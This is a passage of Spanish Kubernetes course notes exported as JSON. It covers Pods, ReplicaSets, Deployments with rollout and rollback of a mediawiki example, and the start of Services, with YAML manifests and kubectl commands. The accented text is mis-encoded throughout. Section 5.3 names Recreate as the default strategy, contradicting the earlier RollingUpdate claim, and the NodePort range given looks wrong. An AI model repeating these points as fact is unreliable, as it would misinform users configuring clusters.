que permita utilizar Kubernetes de una forma homog√©nea e independiente del sistema de contenedores interno asociado.\nEsta capa de abstracci√≥n a√±ade informaci√≥n adicional necesaria en Kubernetes como por ejemplo, pol√≠ticas de reinicio, comprobaciones de que la aplicaci√≥n est√© inicializada (readiness probe) o comprobaciones de que la aplicaci√≥n haya realizado alguna acci√≥n especificada (liveness probe).\n\n\nPod con un solo contenedor\nEn la situaci√≥n m√°s habitual, se definir√° un Pod con un contenedor en su interior para ejecutar un solo proceso y este Pod estar√° ejecut√°ndose mientras lo haga el correspondiente proceso dentro del contenedor. Algunos ejemplos pueden ser: ejecuci√≥n en modo demonio de un servidor web, ejecuci√≥n de un servidor de aplicaciones Java, ejecuci√≥n de una tarea programada, ejecuci√≥n en modo demonio de un servidor DNS, etc.\n\nPod multicontenedor\nEn algunos casos la ejecuci√≥n de un solo proceso por contenedor no es la soluci√≥n ideal, ya que existen procesos fuertemente acoplados que no pueden comunicarse entre s√≠ f√°cilmente si se ejecutan en diferentes sistemas, por lo que la soluci√≥n planteada en esos casos es definir un Pod multicontenedor y ejecutar cada proceso en un contenedor, pero que puedan comunicarse entre s√≠ como si lo estuvieran haciendo en el mismo sistema, utilizando un dispositivo de almacenamiento compartido si hiciese falta (para leer, escribir ficheros entre ellos) y compartiendo externamente una misma direcci√≥n IP. Un ejemplo t√≠pico de un Pod multicontenedor es un servidor web nginx con un servidor de aplicaciones PHP-FPM, que se implementar√≠a mediante un solo Pod, pero ejecutando un proceso de nginx en un contenedor y otro proceso de php-fpm en otro contenedor.\nAl tratarse este curso de un curso de introducci√≥n a Kubernetes no vamos a poder ver todas las cargas de trabajo, ni la ejecuci√≥n y despliegue de todo tipo de aplicaciones, por lo que consideramos m√°s razonable no utilizar ejemplos de Pods multicontenedor y centrarnos en la comprensi√≥n de las caracter√≠sticas principales de Kubernetes mediante ejemplos sencillos, comunes y muy apropiados para ejecutarse en Kubernetes, mediante en uso de Pods con un solo contenedor."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.1-describiendo-un-pod":{"title":"3.1-describiendo-un-pod","links":[],"tags":[],"content":"3.1 Describiendo un pod\nEs posible crear un Pod directamente (lo que se denomina utilizaci√≥n imperativa) mediante kubectl:\nkubectl run pod-nginx --image=nginx\n\nDe esta forma se crea un Pod con un contenedor que utiliza la imagen nginx:latest (no hemos especificado una versi√≥n) del registro que est√© definido por defecto en el cluster de Kubernetes, se asigna una direcci√≥n IP y se lanza en uno de los nodos del cluster.\nUn Pod tiene otros muchos par√°metros asociados, que en este caso quedar√°n sin definir o Kubernetes asumir√° los valores por defecto. Sin embargo es mucho m√°s habitual trabajar con los objetos de Kubernetes de manera declarativa, definiendo los objetos de forma detallada a trav√©s de un fichero en formato YAML. De esta forma tenemos un fichero con la definici√≥n del objeto que hemos lanzado y podemos utilizar en otro momento exactamente la misma definici√≥n o podemos ir modific√°ndola y aplicando los cambios cuando sea conveniente.\nUn ejemplo podr√≠a ser el contenido del fichero pod.yaml:\napiVersion: v1 # required\nkind: Pod # required\nmetadata: # required\n name: pod-nginx # required\n labels:\n   app: nginx\n   service: web\nspec: # required\n containers:\n   - image: nginx:1.16\n     name: contenedor-nginx\n     imagePullPolicy: Always\n\nVeamos cada uno de los par√°metros que hemos definido:\n\napiVersion: v1: La versi√≥n de la API que vamos a usar.\nkind: Pod: La clase de recurso que estamos definiendo.\nmetadata: Informaci√≥n que nos permite identificar un√≠vocamente el recurso:\n\nname: Nombre del pod\nlabels: Las Labels nos permiten etiquetar los recursos de Kubernetes (por ejemplo un pod) con informaci√≥n del tipo clave/valor.\n\n\nspec: Definimos las caracter√≠sticas del recurso. En el caso de un Pod indicamos los contenedores que van a formar el Pod (secci√≥n containers), en este caso s√≥lo uno.\n\nimage: La imagen desde la que se va a crear el contenedor\nname: Nombre del contenedor.\nimagePullPolicy: Las im√°genes se guardan en un registro interno. Se pueden utilizar registros p√∫blicos (google o docker hub son los m√°s usados) y registros privados. La pol√≠tica por defecto es IfNotPresent, que se baja la imagen si no est√° en el registro interno. Si queremos forzar la descarga desde el repositorio externo, tendremos que indicar imagePullPolicy:Always.\n\n\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.2-gestionando-los-pods":{"title":"3.2-gestionando-los-pods","links":[],"tags":[],"content":"3.2 Gestionando los pods\nTenemos un fichero pod.yaml, donde hemos definido un Pod de la siguiente manera:\napiVersion: v1\nkind: Pod\nmetadata:\n name: pod-nginx\n labels:\n   app: nginx\n   service: web\nspec:\n containers:\n   - image: nginx:1.16\n     name: contenedor-nginx\n     imagePullPolicy: Always\n\nPodemos crear directamente el Pod desde el fichero yaml:\nkubectl create -f pod.yaml\n\nY podemos ver el estado en el que se encuentra y si est√° o no listo:\nkubectl get pods\n\n(Ser√≠a equivalente usar po, pod o pods).\nSi queremos ver m√°s informaci√≥n sobre los Pods, como por ejemplo, saber en qu√© nodo del cluster se est√° ejecutando:\nkubectl get pod -o wide\n\nPara obtener informaci√≥n m√°s detallada del Pod (equivalente al inspect de docker):\nkubectl describe pod pod-nginx\n\nPodr√≠amos editar el Pod y ver todos los atributos que definen el objeto, la mayor√≠a de ellos con valores asignados autom√°ticamente por el propio Kubernetes y podremos actualizar ciertos valores:\nkubectl edit pod pod-nginx\n\nSin embargo, es una opci√≥n compleja para utilizarla a estas alturas del curso y hay que comprender mejor c√≥mo funcionan los objetos de Kubernetes para poder hacer modificaciones de forma apropiada, y adem√°s, veremos m√°s adelante otra manera m√°s correcta de actualizar un objeto de Kubernetes.\nNormalmente no se interact√∫a directamente con el Pod a trav√©s de una shell, pero s√≠ se obtienen directamente los logs al igual que se hace en docker:\nkubectl logs pod-nginx\n\nEn el caso poco habitual de que queramos ejecutar alguna orden adicional en el Pod, podemos utilizar el comando exec, por ejemplo, en el caso particular de que queremos abrir una shell de forma interactiva:\nkubectl exec -it pod-nginx -- /bin/bash\n\nPodemos acceder a la aplicaci√≥n, redirigiendo un puerto de localhost al puerto de la aplicaci√≥n:\nkubectl port-forward pod-nginx 8080:80\n\nY accedemos al servidor web en la url http://localhost:8080.\nNOTA: Esta no es la forma con la que accedemos a las aplicaciones en Kubernetes. Para el acceso a las aplicaciones usaremos un recurso llamado Service. Con la anterior instrucci√≥n lo que estamos haciendo es una redirecci√≥n desde localhost el puerto 8080 al puerto 80 del Pod y es √∫til para peque√±as pruebas de funcionamiento, nunca para acceso real a un servicio. NOTA2: El port-forward no es igual a la redirecci√≥n de puertos de docker, ya que en este caso la redirecci√≥n de puertos se hace en el equipo que ejecuta kubectl, no en el equipo que ejecuta los Pods o los contenedores.\nPara obtener las etiquetas de los Pods que hemos creado:\nkubectl get pods --show-labels\n\nLas etiquetas las hemos definido en la secci√≥n metadata del fichero yaml, pero tambi√©n podemos a√±adirlos a los Pods ya creados:\nkubectl label pods pod-nginx service=web --overwrite=true\n\nLas etiquetas son muy √∫tiles, ya que permiten seleccionar un recurso determinado (en un cluster de Kubernetes puede haber cientos o miles de objetos).Por ejemplo para visualizar los Pods que tienen una etiqueta con un determinado valor:\nkubectl get pods -l service=web\n\nTambi√©n podemos visualizar los valores de las etiquetas como una nueva columna:\nkubectl get pods -Lservice\n\nY por √∫ltimo, eliminamos el Pod mediante:\nkubectl delete pod pod-nginx\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.0-tolerancia-y-escalabilidad":{"title":"4.0-tolerancia-y-escalabilidad","links":[],"tags":[],"content":"4. Tolerancia y escalabilidad: ReplicaSets\nReplicaSet es un recurso de Kubernetes que asegura que siempre se ejecuta un n√∫mero de r√©plicas concreto de un Pod determinado. Por lo tanto, nos garantiza que un conjunto de Pods siempre est√°n funcionando y disponibles proporcion√°ndonos las siguientes caracter√≠sticas: Tolerancia a fallos y Escalabilidad din√°mica.\nAunque en el m√≥dulo anterior estudiamos como gestionar el ciclo de vida de los Pods, en Kubernetes no vamos a trabajar directamente con Pods. Un recurso ReplicaSet controla un conjunto de Pods y es el responsable de que estos Pods siempre est√©n ejecut√°ndose (Tolerancia a fallos) y de aumentar o disminuir las r√©plicas de dicho Pod (Escalabilidad din√°mica). Estas r√©plicas de los Pods se ejecutar√°n en nodos distintos del cluster, aunque en nuestro caso al utilizar minikube, un cluster de un solo nodo, no vamos a poder apreciar como se reparte la ejecuci√≥n de los Pods en varios nodos, todos los Pods se ejecutar√°n en la misma m√°quina.\nEl ReplicaSet va a hacer todo lo posible para que el conjunto de Pods que controla siempre se est√©n ejecutando. Por ejemplo: si el nodo del cluster donde se est√°n ejecutando una serie de Pods se apaga, el ReplicaSet crear√≠a nuevos Pods en otro nodo para tener siempre ejecutando el n√∫mero que hemos indicado. Si un Pod se para por cualquier problema, el ReplicaSet intentar√° que vuelva a ejecutarse para que siempre tengamos el n√∫mero de Pods deseado."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.1-describiendo-un-replicaset":{"title":"4.1-describiendo-un-replicaset","links":[],"tags":[],"content":"4.1 Describiendo un ReplicaSet\nEn este caso tambi√©n vamos a definir el recurso de ReplicaSet en un fichero nginx-rs.yaml, por ejemplo como este:\napiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: replicaset-nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n        - image: nginx\n          name: contenedor-nginx\n\nAlgunos de los par√°metros definidos ya lo hemos estudiado en la definici√≥n del Pod. Los nuevos par√°metros de este recurso son los siguientes:\n\nreplicas: Indicamos el n√∫mero de Pods que siempre se deben estar ejecutando.\nselector: Seleccionamos los Pods que va a controlar el ReplicaSet por medio de las etiquetas. Es decir este ReplicaSet controla los Pods cuya etiqueta app es igual a nginx.\ntemplate: El recurso ReplicaSet contiene la definici√≥n de un Pod. F√≠jate que el Pod que hemos definido en la secci√≥n template tiene indicado la etiqueta necesaria para que sea seleccionado por el ReplicaSet (app: nginx).\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.2-gestionando-los-replicaset":{"title":"4.2-gestionando-los-replicaset","links":[],"tags":[],"content":"4.2 Gestionando los ReplicaSet\nCreaci√≥n del ReplicaSet\nAunque en la unidad anterior usamos kubectl create para crear los recursos de nuestro cluster, es recomendable usar kubectl apply. La diferencia es la forma en la que actuamos sobre el cluster:\n\n\nConfiguraci√≥n imperativa de objetos: La definici√≥n del objeto est√° guardada en un fichero Yaml y ejecutamos un comando imperativo. Posteriormente no podremos modificar el objeto, habr√° que borrarlo y crearlo de nuevo. Ejemplos:\n  kubectl create -f recurso.yaml\n  kubectl delete -f recurso.yaml\n\n\n\nConfiguraci√≥n declarativa de objetos: No se definen las acciones a realizar. Cuando se aplica la configuraci√≥n del objeto estamos indicando un estado deseado al que queremos llegar. Posteriormente si la definici√≥n cambia, podremos cambiar el objeto. Recomendado en producci√≥n. Ejemplo:\n  kubectl apply -f recurso.yaml\n\n\n\nPor lo tanto para crear nuestro ReplicaSet, ejecutamos:\nkubectl apply -f nginx-rs.yaml\n\nY podemos ver los recursos que se han creado con:\nkubectl get rs,pods\n\nObservamos que quer√≠amos crear 2 replicas del Pod, y efectivamente se han creado.\nSi queremos obtener informaci√≥n detallada del recurso ReplicaSet que hemos creado:\nkubectl describe rs replicaset-nginx\n\n\nTolerancia a fallos\nY ahora comenzamos con las funcionalidades llamativas de Kubernetes. ¬øQu√© pasar√≠a si borro uno de los Pods que se han creado? Inmediatamente se crear√° uno nuevo para que siempre est√©n ejecut√°ndose los Pods deseados, en este caso 2:\nkubectl delete pod &lt;nombre_del_pod&gt;\nkubectl get pods\n\n\nEscalabilidad\nPara escalar el n√∫mero de pods:\nkubectl scale rs replicaset-nginx --replicas=5\nkubectl get pods\n\nOtra forma de hacerlo ser√≠a cambiando el par√°metro replicas de fichero yaml, y volviendo a ejecutar:\nkubectl apply -f nginx-rs.yaml\n\nLa escalabilidad puede ser para aumentar el n√∫mero de Pods o para reducirla:\nkubectl scale rs replicaset-nginx --replicas=1\n\n\nEliminando el ReplicaSet\nPor √∫ltimo, si borramos un ReplicaSet se borrar√°n todos los Pods asociados:\nkubectl delete rs replicaset-nginx\n\nOtra forma de borrar el recurso, es utilizar el fichero yaml:\nkubectl delete -f nginx-rs.yaml\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.0-deployments":{"title":"5.0-deployments","links":[],"tags":[],"content":"5. Despliegues: Deployments\nEl despliegue o Deployment es la unidad de m√°s alto nivel que podemos gestionar en Kubernetes.\nEn los m√≥dulos anteriores hemos estudiado los Pods y los ReplicaSet, sin embargo, cuando queramos desplegar una aplicaci√≥n en Kubernetes no vamos a gestionar √©stos directamente, sino que vamos a crear un recurso de tipo Deployment. ¬øQu√© ocurre cuando creamos un nuevo recurso Deployment?\n\nLa creaci√≥n de un Deployment conlleva la creaci√≥n de un ReplicaSet que controlar√° un conjunto de Pods creados a partir de la versi√≥n de la imagen que se ha indicado.\nSi hemos desarrollado una nueva versi√≥n de la aplicaci√≥n y hemos creado una nueva imagen con la nueva versi√≥n, podemos modificar el Deployment indicando la nueva versi√≥n de la imagen. En ese momento se crear√° un nuevo ReplicaSet que controlar√° un nuevo conjunto de Pods creados a partir de la nueva versi√≥n de la imagen (habremos desplegado una nueva versi√≥n de la aplicaci√≥n).\nPor lo tanto podemos decir que un Deployment va guardando un historial con los ReplicaSet que se van creando al ir cambiado la versi√≥n de la imagen. El ReplicaSet que est√© activo en un determinado momento ser√° el responsable de crear los Pods con la versi√≥n actual de la aplicaci√≥n.\nSi tenemos un historial de ReplicaSet seg√∫n las distintas versiones de la imagen que estamos utilizando, podemos, de una manera sencilla, volver a una versi√≥n anterior de la aplicaci√≥n (Rollback).\n\nPor la manera de trabajar de un Deployment, podemos indicar las funciones que nos aporta:\n\nControl de r√©plicas\nEscalabilidad de pods\nActualizaciones continuas\nDespliegues autom√°ticos\nRollback a versiones anteriores\n\n\nArquitectura de nuestras aplicaciones\nTenemos dos clases de aplicaciones que podemos desplegar en un cluster de Kubernetes:\n\nAplicaciones que necesitan varios servicios para ejecutarse: por ejemplo una aplicaci√≥n escrita en PHP y servida por un servidor web que necesita un servidor de base de datos para guardar la informaci√≥n. En este caso crearemos dos recursos Deployment: uno para desplegar la aplicaci√≥n PHP y otro para desplegar la base de datos. Por cada servicio que necesite nuestra aplicaci√≥n crearemos un Deployment para desplegarlo.\nAplicaciones construidas con microservicios: cada microservicio se puede desplegar de manera aut√≥noma. Por cada microservicio que forma parte de la aplicaci√≥n crearemos un recurso Deployment. Por ejemplo, una aplicaci√≥n que tenga un frontend para ofrecer la informaci√≥n y que haga llamadas a un backend que ofrece un servicio web por medio de una API RESTful.\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.1-describiendo-un-deployment":{"title":"5.1-describiendo-un-deployment","links":[],"tags":[],"content":"5.1 Describiendo un deployment\nPodemos crear un Deployment de forma imperativa utilizando un comando como el siguiente (se podr√≠an indicar muchos m√°s par√°metros de configuraci√≥n que podemos consultar en la documentaci√≥n):\nkubectl create deployment nginx --image nginx\n\nNosotros, sin embargo, vamos a seguir describiendo los recursos en un fichero yaml. En este caso para describir un Deployment de nginx podemos escribir un fichero nginx-deployment.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-nginx\n  labels:\n    app: nginx\nspec:\n  revisionHistoryLimit: 2\n  strategy:\n    type: RollingUpdate\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: contendor-nginx\n        ports:\n        - name: http\n          containerPort: 80\n\nLa creaci√≥n de un Deployment crea un ReplicaSet y los Pods correspondientes. Por lo tanto en la definici√≥n de un Deployment se define tambi√©n el ReplicaSet asociado (los par√°metros replicas, selector y template). Los atributos relacionados con el Deployment que hemos indicado en la definici√≥n son:\n\nrevisionHistoryLimit: Indicamos cu√°ntos ReplicaSets antiguos deseamos conservar, para poder realizar rollback a estados anteriores. Por defecto, es 10.\nstrategy: Indica el modo en que se realiza una actualizaci√≥n del Deployment. Es decir, cuando modificamos la versi√≥n de la imagen del Deployment, se crea un ReplicaSet nuevo y ¬øqu√© hacemos con los pods?:\n\nRecreate: elimina los Pods antiguos y crea los nuevos.\nRollingUpdate: va creando los nuevos Pods, comprueba que funcionan y se eliminan los antiguos; es la opci√≥n por defecto.\n\n\n\nAdem√°s, hemos introducido un nuevo par√°metro al definir el contenedor del pod: con el par√°metro ports hemos indicado el puerto que expone el contenedor (containerPort) y le hemos asignado un nombre (name)."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.2-gestion-basica-de-un-deployment":{"title":"5.2-gestion-basica-de-un-deployment","links":[],"tags":[],"content":"5.2 Gesti√≥n b√°sica de un deployment\nCreaci√≥n del Deployment\nCuando creamos un Deployment, se crear√° un ReplicaSet asociado, que crear√° y controlar√° los Pods que hayamos indicado.\nkubectl apply -f nginx-deployment.yaml\nkubectl get deploy,rs,pod\n\nPara ver los recursos que hemos creado tambi√©n podemos utilizar la instrucci√≥n:\nkubectl get all\n\nEsta orden muestra los Deployments, ReplicaSets, Pods y Services que tenemos creados en el cluster. Los Services lo estudiaremos en el siguiente m√≥dulo.\n\nEscalado de los Deployments\nComo ocurr√≠a con los ReplicaSets los Deployment tambi√©n se pueden escalar, aumentando o disminuyendo el n√∫mero de Pods asociados. Al escalar un Deployment estamos escalando el ReplicaSet asociado en ese momento:\nkubectl scale deployment deployment-nginx --replicas=4\n\n\nOtras operaciones\nSi queremos acceder a la aplicaci√≥n, podemos utilizar la opci√≥n de port-forward sobre el despliegue (de nuevo recordamos que no es la forma adecuada para acceder a un servicio que se ejecuta en un Pod, pero de momento no tenemos otra). En este caso si tenemos asociados m√°s de un Pod, la redirecci√≥n de puertos se har√° sobre un solo Pod (no habr√° balanceo de carga):\nkubectl port-forward deployment/deployment-nginx 8080:80\n\nSi queremos ver los logs generados en los Pods de un Deployment:\nkubectl logs deployment/deployment-nginx\n\nSi queremos obtener informaci√≥n detallada del recurso Deployment que hemos creado:\nkubectl describe deployment deployment-nginx\n\n\nEliminando el Deployment\nSi eliminamos el Deployment se eliminar√°n el ReplicaSet asociado y los Pods que se estaban gestionando.\nkubectl delete deployment deployment-nginx\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.3-actualizacion-y-desactualizacion-de-un-deployment":{"title":"5.3-actualizacion-y-desactualizacion-de-un-deployment","links":[],"tags":[],"content":"5.3 Actualizaci√≥n y desactualizaci√≥n de un deployment\nCiclo de vida del desarrollo de aplicaciones‚Ä¶\nEl ciclo de vida del desarrollo de aplicaciones cuando trabajamos con contenedores nos facilita la labor de versionar nuestros desarrollos. Por cada nueva versi√≥n que se desarrolla de nuestra aplicaci√≥n podemos crear una nueva imagen del contenedor que podemos versionar utilizando la etiqueta del nombre de la imagen.\nPor lo tanto, al crear un Deployment indicaremos la imagen desde la que se van a crear los Pods. Al indicar la imagen podremos indicar la etiqueta que nos indica la versi√≥n de la aplicaci√≥n que vamos a implantar.\nUna vez que hemos creado un Deployment a partir de una imagen de una versi√≥n determinada, tenemos los Pods ejecutando la versi√≥n indicada de la aplicaci√≥n.\n¬øC√≥mo podemos actualizar a una nueva versi√≥n de la aplicaci√≥n?. Se seguir√°n los siguientes pasos:\n\nTendremos que modificar el valor del par√°metro image para indicar una nueva imagen, especificando la nueva versi√≥n mediante el cambio de etiqueta.\nEn ese momento el Deployment se actualiza, es decir, crea un nuevo ReplicaSet que crear√° nuevos Pods de la nueva versi√≥n de la aplicaci√≥n.\nSeg√∫n la estrategia de despliegue indicada, se ir√°n borrando los antiguos Pods y se crear√°n lo nuevos.\nEl Deployment guardar√° el ReplicaSet antiguo, por si en alg√∫n momento queremos volver a la versi√≥n anterior.\n\nVeamos este proceso con m√°s detalles estudiando un ejemplo de despliegue:\nDesplegando la aplicaci√≥n mediawiki\nVamos a partir del fichero mediawiki-deployment.yamlpara desplegar la aplicaci√≥n:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mediawiki\n  labels:\n    app: mediawiki\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mediawiki\n  template:\n    metadata:\n      labels:\n        app: mediawiki\n    spec:\n      containers:\n      - name: contenedor-mediawiki\n        image: mediawiki:1.38.5\n        ports:\n        - containerPort: 80\n\nSi nos fijamos vamos a desplegar la versi√≥n 1.38.5 de la aplicaci√≥n mediawiki. Creamos el despliegue con la siguiente instrucci√≥n:\nkubectl apply -f mediawiki-deployment.yaml\n\nA continuaci√≥n podemos ‚Äúanotar‚Äù en el despliegue la causa del nuevo despliegue, de esta forma al visualizar el historial de modificaciones veremos las causas que han provocado cada actualizaci√≥n. Para ello:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Primer despliegue. Desplegamos versi√≥n 1.38.5&quot;\n\nPodemos comprobar los recursos que hemos creado:\nkubectl get all\n\nY si accedemos al Pod con un port-forward comprobamos que la versi√≥n actual de la mediawiki es la 1.38.5:\nkubectl port-forward deployment/mediawiki 8080:80\n\n\n\nActualizar un Deployment\nA continuaci√≥n queremos desplegar una versi√≥n m√°s reciente de la mediawiki. Para ello tenemos que modificar el campo image de nuestro Deployment, esta operaci√≥n la podemos hacer de varias formas:\n\n\nModificando el fichero yaml y volviendo a ejecutar un kubectl apply.\n\n\nEjecutando la siguiente instrucci√≥n:\n kubectl set image deployment/mediawiki contenedor-mediawiki=mediawiki:1.39.1\n\n\n\nAl ejecutar la actualizaci√≥n del Deployment podemos observar que se ha creado un nuevo ReplicaSet, que crear√° los nuevos Pods a partir de la versi√≥n modificada de la imagen. ¬øC√≥mo se crean los nuevos Pods y se destruyen los antiguos? Depender√° de la estrategia de despliegue:\n\nPor defecto la estrategia de despliegue es Recreate que elimina los Pods antiguos y crea los nuevos.\nSi indicamos en el despliegue el tipo de estrategia RollingUpdate, se van creando los nuevos Pods, se comprueba que funcionan y se eliminan los antiguos.\n\nA continuaci√≥n indicamos el motivo del cambio del despliegue con una anotaci√≥n:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Segundo despliegue. Actualizamos a la versi√≥n 1.39.1&quot;\n\nVeamos los recursos que se han creado en la actualizaci√≥n:\nkubectl get all\n\nKubernetes utiliza el t√©rmino rollout para la gesti√≥n de diferentes versiones de despliegues. Podemos ver el historial de actualizaciones que hemos hecho sobre el despliegue:\nkubectl rollout history deployment/mediawiki\n\nY nos aparecen las anotaciones que hemos hecho de cada despliegue:\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versi√≥n 1.38.5\n2         Segundo despliegue. Actualizamos a la versi√≥n 1.39.1\n\nY volvemos a acceder a la aplicaci√≥n con un port-forward para comprobar que realmente se ha desplegado la versi√≥n 1.39.1.\n\n\nRollback del Deployment\nEl proceso de despliegue de una nueva versi√≥n de una aplicaci√≥n es una labor cr√≠tica, que tradicionalmente ha dado muchos problemas. Si estamos sirviendo una aplicaci√≥n web que utilizan muchos usuarios, no nos podemos permitir que haya un corte en el servicio por un problema en el despliegue de una nueva versi√≥n.\nEvidentemente, los problemas que pueden aparecer durante el despliegue de una nueva versi√≥n pueden estar causados por muchos motivos, y muchas veces es complicado tener todos los factores controlados. Si finalmente tenemos alguno, la pregunta ser√≠a: ¬øHemos dise√±ado un proceso que nos permita de una manera sencilla y r√°pida volver a la versi√≥n anterior de la aplicaci√≥n que sab√≠amos que funcionaba bien?\nA ese proceso de volver a una versi√≥n anterior de la aplicaci√≥n es lo que llamamos rollback, o de forma concreta en k8s, ‚Äúdeshacer‚Äù un rollout. Veremos en este ejemplo que Kubernetes nos ofrece un mecanismo sencillo de volver a versiones anteriores. Como hemos comentado, las actualizaciones de los Deployment van creando nuevos ReplicaSet, y se va guardando el historial de ReplicaSet anteriores. Deshacer un Rollout ser√° tan sencillo como activar uno de los ReplicaSet antiguos.\nAhora vamos a desplegar una versi√≥n que nos da un error (la versi√≥n 2 de la aplicaci√≥n no existe, no existe la imagen mediawiki:2). ¬øPodremos volver al despliegue anterior?\nkubectl set image deployment mediawiki contenedor-mediawiki=mediawiki:2\n\nY realizamos la anotaci√≥n:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Tercer despliegue. Actualizamos a la versi√≥n 2&quot;\n\nComprobamos el historial de despliegues:\nkubectl rollout history deployment/mediawiki\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versi√≥n 1.38.5\n2         Segundo despliegue. Actualizamos a la versi√≥n 1.39.1\n3         Tercer despliegue. Actualizamos a la versi√≥n 2\n\nDependiendo de la estrategia de despliegue, esto puede provocar que la aplicaci√≥n se quede en la versi√≥n anterior (RollingUpdate) o que no haya ning√∫n Pod v√°lido desplegado (Recreate). En cualquier caso, se puede volver a la versi√≥n anterior del despliegue mediante rollout:\nkubectl rollout undo deployment/mediawiki\nkubectl get all\n\nY terminamos comprobando el historial de actualizaciones:\nkubectl rollout history deployment mediawiki\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versi√≥n 1.38.5\n3         Tercer despliegue. Actualizamos a la versi√≥n 2\n4         Segundo despliegue. Actualizamos a la versi√≥n 1.39.1\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.0-acceso-a-las-aplicaciones":{"title":"6.0-acceso-a-las-aplicaciones","links":[],"tags":[],"content":"6. Acceso a las aplicaciones (Services)\nLos servicios (Services) nos permiten acceder a las aplicaciones que hemos desplegado en el cluster.\n\nUn Service es una abstracci√≥n que nos permite acceder a un conjunto de pods (que se han creado a partir de un Deployment) que implementan una aplicaci√≥n (Por ejemplo: acceder a un servidor web, a una servidor de base de datos, a un servicio que forma parte de una aplicaci√≥n, ‚Ä¶).\nA cada Pod se le asigna una IP a la que no se puede acceder directamente, por lo tanto necesitamos un Service que nos ofrece una direcci√≥n virtual (CLUSTER-IP) y un nombre que identifica al conjunto de Pods que representa, al cual nos podemos conectar.\nLa conexi√≥n al Service se puede realizar desde otros Pods o desde el exterior (mediante la generaci√≥n aleatoria de un puerto). Por ejemplo, si tenemos una aplicaci√≥n formada por dos Services: servidor web y servidor de base de datos, tendremos que acceder desde el exterior al servidor web, y acceder al servidor de base de datos desde el servidor web. En principio no ser√° necesario acceder al servidor de base de datos desde el exterior.\nSi el Deployment que hemos creado tiene m√°s de un Pod asociado, el Service que representa el acceso a esta aplicaci√≥n balancear√° la carga entre los Pods con una pol√≠tica Round Robin.\nEn el cluster existir√° un componente que nos ofrece un servicio DNS. Cada vez que creamos un Service se actualizar√° el DNS para resolver el nombre que hemos asignado al Service con la IP virtual (CLUSTER-IP) que se le ha asignado.\nNota Cuando tenemos m√°s de un Pod ofreciendo el mismo servicio, realmente tenemos un cl√∫ster y es importante distinguir entre servicios sin estado (stateless) o con estado (stateful)). En un servicio sin estado (por ejemplo, un servidor web que sirva contenido est√°tico), las peticiones son independientes y se pueden servir por diferentes nodos sin problema, aunque en el caso de un servidor web, deber√≠amos asegurarnos previamente de que el directorio con los datos es el mismo. Un servicio de este tipo lo podemos escalar con un despliegue sin problema. Por otra parte, si el servicio tiene estado (por ejemplo, un servidor de bases de datos), una petici√≥n puede depender de otra anterior, por lo que puede haber incoherencias si simplemente creamos un cluster de nodos iguales. En este tipo de servicios, es necesaria una configuraci√≥n adicional que controle el estado y que haga que los datos que sirve cada Pod son coherentes entre s√≠. Veremos un ejemplo de este tipo de servicios en el m√≥dulo 9 del curso.\n\nTipos de Services\nClusterIP\nSolo se permite el acceso interno a un Service de este tipo. Es decir, si tenemos un despliegue con una aplicaci√≥n a la que no es necesario acceder desde el exterior, crearemos un Service de este tipo para que otras aplicaciones puedan acceder a ella (por ejemplo, una base de datos). Es el tipo por defecto. Si deseamos seguir accediendo desde el exterior, para hacer pruebas durante la fase de desarrollo podemos seguir utilizando la instrucci√≥n kubectl port-forward.\n\nVeamos el ejemplo:\n\nNecesitamos que los Pods de Wordpress accedan al Pod del MySQL.\nLa IP que ha tomado el Pod de MySQL (172.25.3.5) es inaccesible desde los Pods de Wordpress.\nPor lo tanto hemos creado un Service de tipo ClusterIP, que ha obtenido una ip virtual (192.168.3.5) y expone el puerto de MySQL 3306.\nEsta IP s√≠ es accesible desde los Pods de Wordpress.\nAl acceder a esta IP se balancear√° la carga entre los Pods de MySQL (en el ejemplo s√≥lo tenemos uno).\nAdem√°s en el Wordpress no necesitamos configurar la IP virtual del Service que hemos creado, ya que disponemos de un servidor DNS que resuelve el nombre del Service mysql en la direcci√≥n virtual del Service (192.168.3.5). Por lo tanto en la configuraci√≥n de Wordpress pondremos el nombre mysql como host del servidor de base de datos al que debe acceder.\n\nNodePort\nAbre un puerto, para que el Service sea accesible desde el exterior. Por defecto el puerto generado est√° en el rango de 30000:40000. Para acceder usamos la ip del servidor master del cluster y el puerto asignado.\n\nVeamos el ejemplo:\n\nNecesitamos que los Pods de Wordpress sean accesibles desde el exterior, para que podamos acceder a la aplicaci√≥n.\nLa IP que han tomado los Pods de Wordpress (172.25.3.3, ‚Ä¶) no son accesibles desde el exterior. Adem√°s comprobamos que estos Pods est√°n ofreciendo el servicio en el puerto 8080.\nPor lo tanto, hemos creado un Service de tipo NodePort que ha obtenido una IP virtual (192.168.3.4) y expone el puerto 80.\nAl acceder a esta IP al puerto 